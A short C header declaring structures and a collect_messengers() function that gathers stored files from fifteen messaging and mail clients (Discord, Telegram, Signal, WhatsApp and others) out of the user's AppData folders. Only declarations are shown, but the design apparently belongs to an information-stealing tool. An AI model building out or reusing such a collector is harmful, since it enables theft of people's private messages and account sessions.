#ifndef MESSENGERS_H
#define MESSENGERS_H

#include <stddef.h>

typedef struct {
    char **files;
    size_t count;
    char *name;
} MessengerResult;

typedef struct {
    MessengerResult discord;
    MessengerResult telegram;
    MessengerResult signal;
    MessengerResult whatsapp;
    MessengerResult skype;
    MessengerResult viber;
    MessengerResult element;
    MessengerResult session;
    MessengerResult tox;
    MessengerResult icq;
    MessengerResult pidgin;
    MessengerResult outlook;
    MessengerResult jabber;
    MessengerResult microsip;
    MessengerResult telegram_mods;
} MessengerData;

// Collect data from all messengers
MessengerData collect_messengers(const char *roaming_app_data, const char *local_app_data);

// Free collected data
void free_messenger_data(MessengerData *data);

#endif
